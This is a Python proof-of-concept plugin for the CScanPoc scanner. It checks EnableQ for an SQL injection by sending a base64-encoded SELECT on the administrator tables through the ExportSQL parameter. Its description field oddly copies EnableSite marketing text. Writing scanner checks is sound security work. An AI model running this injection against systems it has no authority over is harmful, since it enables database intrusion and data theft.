# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'EnableQ_0001'  # 平台漏洞编号，留空
    name = 'EnableQ全版本 sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-23'  # 漏洞公布时间
    desc = '''
        EnableQ全版本通杀sql注入(越权整个SQL语句注射)：
        EnableSite是一个提供完整网站生命周期管理TM的应用软件系统。针对网站生命周期中的SPRIMTM五要素，提供了快速易用、功能强大的丰富应用功能。EnableSite能够帮助用户迅速高效的构建、实施和维护具有丰富内容类型的、关键的企业网站系统。通过面向网站内容和使用习惯的操作处理机制，EnableSite降低了系统部署的成本，同时也完善和提高了商业用户对于企业网站内容的管理和操控能力，提高了网站内容访问的质量和效率。
        网站内容管理的全面解决方案
        EnableSite能够让商业用户随时随地的建立和发布以及管理各种复杂多样的信息内容，借助简单明了的向导程序、熟悉易用的编辑工具、灵活应用的美工标签、即选即用的内置类型、简洁方便的配置选项，您可以更随心所欲地将商业信息展现给商业客户，同时也更有效地利用对企业网站内容的迅速更新提高商业服务层次。
        快速部署和较少的成本投入
        建立和部署基于Web方式的信息服务门户将变得比以往更快速和高效。相比较大量手工代码编写的程序实现而言，EnableSite提供了通用性极强的内置内容类型直接使用，并且更广泛的内容兼容性和对内容类型的灵活配置也对部署的速度和质量提供了进一步帮助。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=088298'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EnableQ'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd1670d9f-da77-4e01-9af8-51461ae6d852'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2010-088298
            payload = '/enableq/enableq91_php52/Export/Export.log.inc.php?ExportSQL=U0VMRUNUIGEuKixjb25jYXQoTUQ1KDEpLCc6JyxkYXRhYmFzZSgpKSBhcyBhZG1pbmlzdHJhdG9yc05hbWUgRlJPTSBlcV9hZG1pbmlzdHJhdG9yc2xvZyBhLCBlcV9hZG1pbmlzdHJhdG9ycyBiIFdIRVJFIGEuYWRtaW5pc3RyYXRvcnNJRD1iLmFkbWluaXN0cmF0b3JzSUQgT1JERVIgQlkgYS5hZG1pbmlzdHJhdG9yc0xvZ0lEIERFU0M='
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
